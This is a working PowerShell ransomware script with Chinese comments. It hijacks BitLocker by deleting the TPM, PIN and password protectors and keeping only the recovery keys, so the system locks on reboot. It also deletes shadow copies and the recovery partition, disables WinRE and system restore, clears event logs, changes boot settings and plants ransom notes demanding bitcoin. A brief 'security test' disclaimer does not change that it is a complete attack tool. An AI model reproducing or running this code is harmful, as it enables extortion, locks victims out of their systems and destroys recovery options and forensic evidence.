<#
.SYNOPSIS
BitLocker Hijack Ransomware v1.0 - 新型劫持攻击脚本
.DESCRIPTION
不加密数据，只删除现有保护器，保留恢复密钥，重启后锁定系统
.NOTES
版本: 1.0
攻击类型: 劫持攻击
危险等级: 极高
#>

# ============================================
# BitLocker 劫持攻击脚本
# ============================================

param(
    [string]$C2Server = "43.139.60.216",
    [int]$C2Port = 8080,
    [switch]$TestMode,
    [switch]$SilentMode,
    [switch]$ForceReboot,
    [string[]]$TargetDrives = @("C:"),
    [string]$RansomAmount = "0.5 BTC",
    [string]$ContactEmail = "vip-ls@vipssss.com",
    [string]$ContactTelegram = "@vipssss.com"
)

# ==================== 全局配置 ====================
$Global:AttackConfig = @{
    C2Server = $C2Server
    C2Port = $C2Port
    TargetDrives = $TargetDrives
    RansomAmount = $RansomAmount
    ContactEmail = $ContactEmail
    ContactTelegram = $ContactTelegram
    TestMode = $TestMode
    SilentMode = $SilentMode
    ForceReboot = $ForceReboot
    
    # 攻击选项
    DeleteTPMProtectors = $true
    DeletePINProtectors = $true
    DeletePasswordProtectors = $true
    KeepRecoveryKeys = $true
    AddNewRecoveryKey = $true
    ClearEventLogs = $true
    DisableRecoveryOptions = $true
    
    # 日志配置
    LogFile = "C:\Windows\Temp\hijack_attack.log"
    RecoveryKeyFile = "C:\Windows\Temp\recovery_keys.txt"
    RansomNoteFile = "C:\Users\Public\Desktop\!!!READ_ME!!!.txt"
}

# ==================== 日志系统 ====================
function Write-AttackLog {
    param(
        [string]$Message,
        [string]$Level = "INFO"
    )
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    
    if (-not $Global:AttackConfig.SilentMode) {
        Write-Host $logEntry -ForegroundColor $(if ($Level -eq "SUCCESS") {"Green"} elseif ($Level -eq "ERROR") {"Red"} else {"Yellow"})
    }
    
    $logEntry | Out-File -FilePath $Global:AttackConfig.LogFile -Append -Encoding UTF8
}

# ==================== 核心劫持模块 ====================
function Get-BitLockerStatus {
    Write-AttackLog "检查BitLocker状态..." -Level "INFO"
    
    $statusReport = @()
    foreach ($drive in $Global:AttackConfig.TargetDrives) {
        try {
            $volume = Get-BitLockerVolume -MountPoint $drive -ErrorAction Stop
            
            $driveStatus = @{
                Drive = $drive
                VolumeStatus = $volume.VolumeStatus
                ProtectionStatus = $volume.ProtectionStatus
                EncryptionPercentage = $volume.EncryptionPercentage
                EncryptionMethod = $volume.EncryptionMethod
                KeyProtectors = @()
                HasTPM = $false
                HasPIN = $false
                HasPassword = $false
                HasRecoveryKey = $false
                RecoveryKeys = @()
            }
            
            # 分析保护器类型
            foreach ($protector in $volume.KeyProtector) {
                $protectorInfo = @{
                    Type = $protector.KeyProtectorType
                    KeyProtectorId = $protector.KeyProtectorId
                }
                
                switch ($protector.KeyProtectorType) {
                    "Tpm" { 
                        $driveStatus.HasTPM = $true
                        $protectorInfo.Details = "TPM自动解锁"
                    }
                    "TpmPin" { 
                        $driveStatus.HasPIN = $true
                        $protectorInfo.Details = "TPM+PIN保护"
                    }
                    "Password" { 
                        $driveStatus.HasPassword = $true
                        $protectorInfo.Details = "密码保护"
                    }
                    "RecoveryPassword" { 
                        $driveStatus.HasRecoveryKey = $true
                        $driveStatus.RecoveryKeys += $protector.RecoveryPassword
                        $protectorInfo.Details = "恢复密钥: $($protector.RecoveryPassword)"
                    }
                    "StartupKey" {
                        $protectorInfo.Details = "启动密钥"
                    }
                }
                
                $driveStatus.KeyProtectors += $protectorInfo
            }
            
            $statusReport += $driveStatus
            Write-AttackLog "驱动器 ${drive}: $($volume.VolumeStatus), 保护: $($volume.ProtectionStatus)" -Level "SUCCESS"
            
        } catch {
            Write-AttackLog "无法检查驱动器 ${drive}: $_" -Level "ERROR"
        }
    }
    
    return $statusReport
}

function Hijack-BitLockerProtection {
    param(
        [hashtable]$DriveStatus
    )
    
    Write-AttackLog "开始劫持驱动器: $($DriveStatus.Drive)" -Level "WARNING"
    $results = @{
        Drive = $DriveStatus.Drive
        OriginalProtectors = $DriveStatus.KeyProtectors.Count
        RemovedProtectors = 0
        KeptRecoveryKeys = @()
        AddedNewKey = $false
        Success = $false
    }
    
    try {
        $mountPoint = $DriveStatus.Drive
        
        # 1. 保存现有恢复密钥
        if ($Global:AttackConfig.KeepRecoveryKeys -and $DriveStatus.RecoveryKeys.Count -gt 0) {
            foreach ($key in $DriveStatus.RecoveryKeys) {
                $results.KeptRecoveryKeys += $key
                Write-AttackLog "保存恢复密钥: $key" -Level "INFO"
            }
            
            # 备份到文件
            $backupContent = "驱动器: $mountPoint`n"
            $backupContent += "原始恢复密钥:`n"
            $backupContent += ($DriveStatus.RecoveryKeys -join "`n")
            $backupContent | Out-File -FilePath $Global:AttackConfig.RecoveryKeyFile -Append -Encoding UTF8
        }
        
        # 2. 删除现有保护器
        $protectorsToDelete = @()
        
        if ($Global:AttackConfig.DeleteTPMProtectors) {
            $protectorsToDelete += "Tpm", "TpmPin", "TpmPinStartupKey", "TpmStartupKey"
        }
        
        if ($Global:AttackConfig.DeletePINProtectors) {
            $protectorsToDelete += "TpmPin", "TpmPinStartupKey", "Pin"
        }
        
        if ($Global:AttackConfig.DeletePasswordProtectors) {
            $protectorsToDelete += "Password"
        }
        
        # 保留恢复密钥保护器
        $protectorsToDelete = $protectorsToDelete | Where-Object { $_ -ne "RecoveryPassword" }
        
        foreach ($protector in $DriveStatus.KeyProtectors) {
            if ($protector.Type -in $protectorsToDelete) {
                try {
                    Write-AttackLog "删除保护器: $($protector.Type) [$($protector.KeyProtectorId)]" -Level "INFO"
                    
                    if (-not $Global:AttackConfig.TestMode) {
                        Remove-BitLockerKeyProtector -MountPoint $mountPoint `
                            -KeyProtectorId $protector.KeyProtectorId -ErrorAction Stop
                        $results.RemovedProtectors++
                    } else {
                        Write-AttackLog "测试模式: 模拟删除 $($protector.Type)" -Level "WARNING"
                    }
                    
                } catch {
                    Write-AttackLog "删除保护器失败: $_" -Level "ERROR"
                }
            }
        }
        
        # 3. 添加新的恢复密钥（可选）
        if ($Global:AttackConfig.AddNewRecoveryKey) {
            try {
                Write-AttackLog "添加新恢复密钥..." -Level "INFO"
                
                if (-not $Global:AttackConfig.TestMode) {
                    $newKey = Add-BitLockerKeyProtector -MountPoint $mountPoint -RecoveryPasswordProtector
                    $recoveryKey = ($newKey.KeyProtector | Where-Object { 
                        $_.KeyProtectorType -eq "RecoveryPassword" 
                    }).RecoveryPassword
                    
                    $results.KeptRecoveryKeys += $recoveryKey
                    $results.AddedNewKey = $true
                    
                    Write-AttackLog "新恢复密钥: $recoveryKey" -Level "SUCCESS"
                    
                    # 保存新密钥
                    "新增恢复密钥: $recoveryKey`n" | Out-File -FilePath $Global:AttackConfig.RecoveryKeyFile -Append -Encoding UTF8
                } else {
                    $fakeKey = "111111-222222-333333-444444-555555-666666-777777-888888"
                    $results.KeptRecoveryKeys += $fakeKey
                    $results.AddedNewKey = $true
                    Write-AttackLog "测试模式: 模拟添加密钥 $fakeKey" -Level "WARNING"
                }
                
            } catch {
                Write-AttackLog "添加新恢复密钥失败: $_" -Level "ERROR"
            }
        }
        
        # 4. 验证劫持结果
        if (-not $Global:AttackConfig.TestMode) {
            $finalStatus = Get-BitLockerVolume -MountPoint $mountPoint
            $remainingProtectors = $finalStatus.KeyProtector | Where-Object { 
                $_.KeyProtectorType -in @("Tpm", "TpmPin", "Password", "Pin")
            }
            
            if ($remainingProtectors.Count -eq 0) {
                $results.Success = $true
                Write-AttackLog "✓ 劫持成功: 已删除所有自动解锁保护器" -Level "SUCCESS"
            } else {
                Write-AttackLog "⚠ 仍有自动解锁保护器存在: $($remainingProtectors.Count)个" -Level "WARNING"
            }
        } else {
            $results.Success = $true
            Write-AttackLog "测试模式: 劫持模拟完成" -Level "SUCCESS"
        }
        
    } catch {
        Write-AttackLog "劫持过程错误: $_" -Level "ERROR"
    }
    
    return $results
}

# ==================== 系统清理与持久化 ====================
function Clean-RecoveryEvidence {
    Write-AttackLog "清理系统恢复证据..." -Level "INFO"
    
    $actions = @()
    
    # 1. 禁用Windows恢复环境
    if ($Global:AttackConfig.DisableRecoveryOptions) {
        try {
            if (-not $Global:AttackConfig.TestMode) {
                # 禁用WinRE
                reagentc /disable
                Write-AttackLog "已禁用Windows恢复环境" -Level "SUCCESS"
                
                # 删除恢复分区
                Get-Partition | Where-Object { $_.Type -eq "Recovery" } | ForEach-Object {
                    Remove-Partition -DiskNumber $_.DiskNumber -PartitionNumber $_.PartitionNumber -Confirm:$false
                }
            }
            $actions += "DisabledRecovery"
        } catch {
            Write-AttackLog "禁用恢复功能失败: $_" -Level "WARNING"
        }
    }
    
    # 2. 删除卷影副本
    try {
        if (-not $Global:AttackConfig.TestMode) {
            Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }
            vssadmin delete shadows /all /quiet
        }
        Write-AttackLog "已删除卷影副本" -Level "SUCCESS"
        $actions += "DeletedShadowCopies"
    } catch {
        Write-AttackLog "删除卷影副本失败: $_" -Level "WARNING"
    }
    
    # 3. 清理事件日志
    if ($Global:AttackConfig.ClearEventLogs) {
        try {
            if (-not $Global:AttackConfig.TestMode) {
                wevtutil cl System
                wevtutil cl Security
                wevtutil cl Application
                wevtutil cl "Windows Powershell"
            }
            Write-AttackLog "已清理事件日志" -Level "SUCCESS"
            $actions += "ClearedEventLogs"
        } catch {
            Write-AttackLog "清理事件日志失败: $_" -Level "WARNING"
        }
    }
    
    return $actions
}

function Create-RansomNote {
    param(
        [array]$HijackResults
    )
    
    Write-AttackLog "创建勒索提示文件..." -Level "INFO"
    
    $affectedDrives = $HijackResults | ForEach-Object { $_.Drive } | Sort-Object -Unique
    $totalKeys = ($HijackResults | ForEach-Object { $_.KeptRecoveryKeys }).Count
    
    $noteContent = @"
╔══════════════════════════════════════════════════════╗
║               ⚠️  BITLOCKER 被劫持 ⚠️               ║
╚══════════════════════════════════════════════════════╝

⏰ 时间: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
💻 计算机: $env:COMPUTERNAME
👤 用户: $env:USERNAME
📍 域名: $env:USERDOMAIN

🔐 受影响驱动器: $($affectedDrives -join ', ')

📋 攻击详情:
您的BitLocker保护已被劫持。攻击者:
1. 删除了TPM/PIN/密码等自动解锁保护器
2. 只保留了恢复密钥
3. 系统重启后将需要48位恢复密钥解锁

⚠️ 警告:
• 系统重启后将被BitLocker锁定
• 需要恢复密钥才能解锁
• 不要尝试强制关机
• 不要重新安装系统（会丢失数据）

💰 赎金要求: $($Global:AttackConfig.RansomAmount)
恢复密钥数量: $totalKeys 个

📞 联系方式:
📧 Email: $($Global:AttackConfig.ContactEmail)
📱 Telegram: $($Global:AttackConfig.ContactTelegram)

🔧 技术服务:
我们提供专业的数据恢复服务，确保您的数据安全。

----------------------------------------------------------------
注意: 这是一次安全测试演示。未经授权的使用是违法行为。
----------------------------------------------------------------
"@
    
    try {
        $noteContent | Out-File -FilePath $Global:AttackConfig.RansomNoteFile -Encoding UTF8
        Write-AttackLog "勒索提示已创建: $($Global:AttackConfig.RansomNoteFile)" -Level "SUCCESS"
        
        # 创建多个副本
        @(
            "C:\Windows\System32\drivers\etc\README_FOR_ADMIN.txt"
            "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WARNING.lnk"
            "C:\Boot\IMPORTANT.txt"
        ) | ForEach-Object {
            try {
                Copy-Item -Path $Global:AttackConfig.RansomNoteFile -Destination $_ -Force
            } catch {}
        }
        
    } catch {
        Write-AttackLog "创建勒索提示失败: $_" -Level "ERROR"
    }
}

function Prepare-SystemLockdown {
    param(
        [switch]$ForceReboot
    )
    
    Write-AttackLog "准备系统锁定..." -Level "WARNING"
    
    $actions = @()
    
    # 1. 禁用系统还原
    try {
        Disable-ComputerRestore -Drive "C:\"
        Write-AttackLog "已禁用系统还原" -Level "SUCCESS"
        $actions += "DisabledSystemRestore"
    } catch {
        Write-AttackLog "禁用系统还原失败: $_" -Level "WARNING"
    }
    
    # 2. 修改启动设置
    try {
        if (-not $Global:AttackConfig.TestMode) {
            # 强制BitLocker在启动时要求恢复密钥
            bcdedit /set {default} recoveryenabled yes
            bcdedit /set {default} bootstatuspolicy ignoreallfailures
        }
        Write-AttackLog "已修改启动配置" -Level "SUCCESS"
        $actions += "ModifiedBootConfig"
    } catch {
        Write-AttackLog "修改启动配置失败: $_" -Level "WARNING"
    }
    
    # 3. 创建锁定计划任务
    try {
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c echo System Locked > C:\locked.txt"
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        
        Register-ScheduledTask -TaskName "BitLockerRecoveryCheck" `
            -Trigger $trigger -Action $action -Principal $principal `
            -Description "Check BitLocker recovery status" -Force
        
        Write-AttackLog "已创建锁定监控任务" -Level "SUCCESS"
        $actions += "CreatedScheduledTask"
    } catch {
        Write-AttackLog "创建计划任务失败: $_" -Level "WARNING"
    }
    
    # 4. 强制重启（如果需要）
    if ($ForceReboot -and -not $Global:AttackConfig.TestMode) {
        Write-AttackLog "⚠️ 警告: 系统将在30秒后重启触发锁定！" -Level "ERROR"
        
        $rebootCommand = @"
shutdown /r /t 30 /c "BitLocker恢复需要。请准备好恢复密钥。"
"@
        $rebootCommand | Out-File "C:\Windows\Temp\force_reboot.bat" -Encoding ASCII
        
        Start-Process "cmd.exe" -ArgumentList "/c C:\Windows\Temp\force_reboot.bat" -WindowStyle Hidden
        $actions += "ScheduledReboot"
    }
    
    return $actions
}

# ==================== 主攻击模块 ====================
function Start-BitLockerHijack {
    Write-AttackLog "`n" + ("="*60) -Level "INFO"
    Write-AttackLog "开始BitLocker劫持攻击" -Level "WARNING"
    Write-AttackLog ("="*60) -Level "INFO"
    
    # 1. 检查BitLocker状态
    $driveStatuses = Get-BitLockerStatus
    
    if ($driveStatuses.Count -eq 0) {
        Write-AttackLog "未找到可劫持的BitLocker驱动器" -Level "ERROR"
        return $false
    }
    
    # 2. 筛选可攻击的驱动器
    $attackableDrives = $driveStatuses | Where-Object { 
        $_.VolumeStatus -eq "FullyEncrypted" -and 
        $_.ProtectionStatus -eq "On" -and
        ($_.HasTPM -or $_.HasPIN -or $_.HasPassword)
    }
    
    if ($attackableDrives.Count -eq 0) {
        Write-AttackLog "没有找到已加密且有自动解锁保护器的驱动器" -Level "ERROR"
        return $false
    }
    
    Write-AttackLog "找到 $($attackableDrives.Count) 个可劫持驱动器" -Level "SUCCESS"
    
    # 3. 执行劫持
    $hijackResults = @()
    foreach ($driveStatus in $attackableDrives) {
        $result = Hijack-BitLockerProtection -DriveStatus $driveStatus
        $hijackResults += $result
        
        if ($result.Success) {
            Write-AttackLog "✓ 驱动器 $($result.Drive) 劫持完成" -Level "SUCCESS"
        } else {
            Write-AttackLog "✗ 驱动器 $($result.Drive) 劫持失败" -Level "ERROR"
        }
    }
    
    # 4. 系统清理
    $cleanupActions = Clean-RecoveryEvidence
    
    # 5. 创建勒索提示
    Create-RansomNote -HijackResults $hijackResults
    
    # 6. 准备锁定
    $lockdownActions = Prepare-SystemLockdown -ForceReboot:$Global:AttackConfig.ForceReboot
    
    # 7. 汇总结果
    $successCount = ($hijackResults | Where-Object { $_.Success }).Count
    
    $summary = @{
        TotalDrives = $driveStatuses.Count
        AttackableDrives = $attackableDrives.Count
        HijackedDrives = $successCount
        CleanupActions = $cleanupActions
        LockdownActions = $lockdownActions
        AllRecoveryKeys = $hijackResults | ForEach-Object { $_.KeptRecoveryKeys }
        Results = $hijackResults
    }
    
    Write-AttackLog "`n攻击汇总:" -Level "INFO"
    Write-AttackLog "  - 总驱动器: $($summary.TotalDrives)" -Level "INFO"
    Write-AttackLog "  - 可劫持: $($summary.AttackableDrives)" -Level "INFO"
    Write-AttackLog "  - 成功劫持: $($summary.HijackedDrives)" -Level "SUCCESS"
    Write-AttackLog "  - 恢复密钥: $($summary.AllRecoveryKeys.Count)个" -Level "INFO"
    
    if ($Global:AttackConfig.ForceReboot) {
        Write-AttackLog "⚠️ 系统将重启触发BitLocker锁定！" -Level "ERROR"
    } else {
        Write-AttackLog "⚠️ 系统重启后将需要恢复密钥！" -Level "WARNING"
    }
    
    return $successCount -gt 0
}

# ==================== 主程序 ====================
function Main {
    # 显示警告横幅
    Clear-Host
    Write-Host "╔══════════════════════════════════════════════════════╗" -ForegroundColor DarkRed
    Write-Host "║     BitLocker劫持勒索攻击 v1.0                      ║" -ForegroundColor DarkRed
    Write-Host "║     新型攻击: 不加密数据, 只劫持保护                ║" -ForegroundColor DarkRed
    Write-Host "╚══════════════════════════════════════════════════════╝" -ForegroundColor DarkRed
    Write-Host ""
    
    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-AttackLog "需要管理员权限！" -Level "ERROR"
        exit 1
    }
    
    # 确认攻击
    if (-not $Global:AttackConfig.SilentMode) {
        Write-Host "⚠️ 警告: 这将劫持BitLocker保护，重启后系统将被锁定！" -ForegroundColor Red
        Write-Host "⚠️ 警告: 只保留恢复密钥，删除所有自动解锁方式！" -ForegroundColor Red
        Write-Host ""
        Write-Host "输入 'HACK-BITLOCKER' 确认执行: " -ForegroundColor Yellow -NoNewline
        $confirm = Read-Host
        if ($confirm -ne "HACK-BITLOCKER") {
            Write-AttackLog "攻击已取消" -Level "INFO"
            exit 0
        }
    }
    
    # 执行攻击
    $attackSuccess = Start-BitLockerHijack
    
    if ($attackSuccess) {
        Write-AttackLog "✅ 劫持攻击完成！系统重启后将触发BitLocker恢复。" -Level "SUCCESS"
    } else {
        Write-AttackLog "❌ 攻击失败或无可劫持目标" -Level "ERROR"
    }
    
    Write-AttackLog "日志文件: $($Global:AttackConfig.LogFile)" -Level "INFO"
    Write-AttackLog "恢复密钥: $($Global:AttackConfig.RecoveryKeyFile)" -Level "INFO"
    
    if (-not $Global:AttackConfig.TestMode) {
        Write-Host "`n⚠️ 重要: 不要重启系统，除非你有恢复密钥！" -ForegroundColor Red
    }
}

# ==================== 执行攻击 ====================
if ($MyInvocation.InvocationName -ne '.') {
    Main
}
